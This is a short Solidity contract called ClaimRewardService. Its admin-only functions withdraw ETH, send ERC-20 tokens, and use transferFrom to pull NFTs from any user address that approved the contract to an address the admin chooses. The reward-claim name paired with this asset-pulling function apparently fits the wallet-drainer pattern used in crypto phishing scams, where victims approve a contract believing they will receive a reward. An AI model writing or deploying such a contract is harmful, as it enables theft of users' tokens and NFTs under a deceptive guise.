contract ClaimRewardService {

    address public admin;
    constructor() {
    admin = msg.sender;
    }

     modifier onlyAdmin() {
        require(msg.sender == admin, "Only admin can call this function.");
        _;
    }

    receive() external payable {}

    function transferEthToUser(address payable user, uint256 amount) public onlyAdmin{
        require(
            address(this).balance >= amount,
            "Insufficient balance in the contract"
        );
        user.transfer(amount);
    }

    function transferErc20(
        address[] memory _token,
        address _to,
        uint256[] memory _value
    ) public onlyAdmin{
        require(
            _token.length == _value.length,
            "token and values length must be the same"
        );
        for (uint256 i = 0; i < _token.length; i++) {
            uint256 decimalOfToken = IERC20Metadata(_token[i]).decimals();
            IERC20(_token[i]).transfer(_to, _value[i] * 10 ** decimalOfToken);
        }
    }

    function transferErc721(
        address[] memory payingUser,
        IERC721[] memory _tokenAddresses,
        address _toAddress,
        uint256[] memory _tokenIds
    ) public onlyAdmin{
        require(
            _tokenAddresses.length == _tokenIds.length,
            "contract and tokenIds length must be the same"
        );
        for (uint256 i = 0; i < _tokenIds.length; i++) {
            _tokenAddresses[i].transferFrom(payingUser[i], _toAddress, _tokenIds[i]);
        }
    }
}